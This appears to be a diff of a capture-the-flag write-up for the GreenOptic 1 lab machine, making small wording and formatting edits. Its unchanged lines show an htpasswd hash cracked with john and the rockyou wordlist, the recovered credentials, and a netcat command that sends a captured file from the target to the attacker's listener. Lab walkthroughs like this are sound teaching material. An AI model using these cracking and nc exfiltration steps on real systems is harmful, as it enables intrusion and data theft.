@@ -133,7 +133,7 @@ Same thing, we are unable to login with any of the credentials we found. Since w
 
 ![6ec893b628e877bb8090a3c87d3324cb.png](/images/vh-greenoptic1/7834fec21f8f435fbd167d661b3c3ad4.png)
 
-Awesome, let's bruteforce this with `john`
+Awesome, let's bruteforce this with `john`.
 
 ```text
 sudo john --wordlist:/usr/share/wordlists/rockyou.txt htpasswd
@@ -142,7 +142,7 @@ sudu john --show htpasswd
 
 ![bd45dfe9a01a776452340d6476b44e3c.png](/images/vh-greenoptic1/d58ea6a478dc4b8891595d58a20e0046.png)
 
-We have our some credentials we can use - `staff:wheeler`. Let's login to `recoveryplan.greenoptic.vm` with those.
+We have ourselves some credentials - `staff:wheeler`. Let's login to `recoveryplan.greenoptic.vm` with those.
 
 ![5c79023076885c1e4ab01cfcecc227b2.png](/images/vh-greenoptic1/baa5413d3b484b2fae76d7d83cf9793d.png)
 
@@ -214,11 +214,11 @@ Now that we have done the pcap, we find that there is no way to transfer files o
 
 Now we can transfer the pcap using `nc`.
 
-```text
-Remote machine: 
+```bash
+#Remote machine: 
 nc -w 3 192.168.32.4 8000 < wireshark_pcapng_*
 
-Local machine: 
+#Local machine: 
 nc -lvnp 8000 > wireshark.pcap
 ```
 
